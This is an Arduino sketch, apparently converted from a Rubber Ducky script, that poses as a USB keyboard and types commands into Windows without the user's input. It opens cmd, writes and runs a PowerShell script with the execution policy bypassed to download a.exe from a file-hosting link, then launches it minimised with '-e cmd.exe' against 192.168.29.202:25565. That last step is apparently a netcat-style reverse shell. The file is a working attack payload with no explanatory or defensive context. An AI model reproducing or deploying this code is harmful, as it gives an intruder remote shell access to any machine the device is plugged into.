/*
 * Generated with <3 by Dckuino.js, an open source project !
 */

#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  delay(400);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(100);

  Keyboard.print("cmd");

  typeKey(KEY_RETURN);

  delay(100);

  Keyboard.print("cd / & mkdir win & cd win & echo (wget 'https://1fichier.com/?w90668xj8y4hwognm3xz' -OutFile a.exe) > b.PS1 & powershell -ExecutionPolicy ByPass -File b.ps1");

  typeKey(KEY_RETURN);

  delay(50);

  Keyboard.print("START /MIN a.exe 192.168.29.202 25565 -e cmd.exe -d & exit");

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
